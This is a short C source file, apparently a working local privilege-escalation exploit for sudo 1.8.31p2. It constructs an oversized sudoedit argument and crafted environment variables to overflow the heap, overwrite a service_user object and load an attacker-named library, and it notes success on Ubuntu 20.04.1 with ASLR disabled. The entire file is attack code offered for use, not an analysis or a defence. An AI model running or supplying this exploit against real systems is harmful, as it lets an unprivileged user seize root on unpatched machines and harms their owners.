//The below exploit worked on Ubuntu 20.04.1 LTS with ASLR turned off. For the exploitation of (sudo 1.8.31p2)
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define USER_BUFF_SIZE 0x30 // malloc() will allocate 0x40 bytes of size of the vulnerable chunk
#define ENVP_SIZE 52
#define OVERFLOW ((1072 - 0x30) + 0x2)//This is the offset to reach the service_user object allocated on the heap :)
#define LC_TIME_SIZE 100
#define LC_TIME "LC_TIME=C.UTF-8@"


int main(int argc, char **argv){
    char user_buff[USER_BUFF_SIZE];
    char *envp[ENVP_SIZE]; //Environment variable pointerz
    char lc_time_var[LC_TIME_SIZE];
    
    char overflow_buffer[OVERFLOW]; //overflow (padding) bufferz
    char library_name[] = "ffs/ffs";

    memset(user_buff, 'A', USER_BUFF_SIZE);
   

    user_buff[USER_BUFF_SIZE - 0x2] = 0x5c; //add "//"
    user_buff[USER_BUFF_SIZE - 0x1] = 0x0; // add a NULL-byte to terminate the command-line argz
   
    // overflow to the allocated chunk boundary
    memset(overflow_buffer, 'B', OVERFLOW);
    overflow_buffer[OVERFLOW - 0x2] = 0x5c;
    overflow_buffer[OVERFLOW - 0x1] = 0x0;

    strcpy(lc_time_var, LC_TIME);

    memset(lc_time_var + strlen(LC_TIME), 'B', LC_TIME_SIZE - strlen(LC_TIME));
    lc_time_var[LC_TIME_SIZE - 0x1] = 0x0;
       
    //copy all these stuff into ENVP variables
    
    envp[0] = overflow_buffer; //Buffer to overflow Heap :)
    
    for (int i = 1; i < ENVP_SIZE;i++)
            envp[i] = "\\";
  
    envp[ENVP_SIZE - 0x3] = library_name;
    envp[ENVP_SIZE - 0x2] = lc_time_var;
    envp[ENVP_SIZE - 0x1] = NULL;

    char *args[] = {"/usr/local/bin/sudoedit", "-s", user_buff, NULL};
   
    execve(args[0], args, envp);
    
    return 0;

}
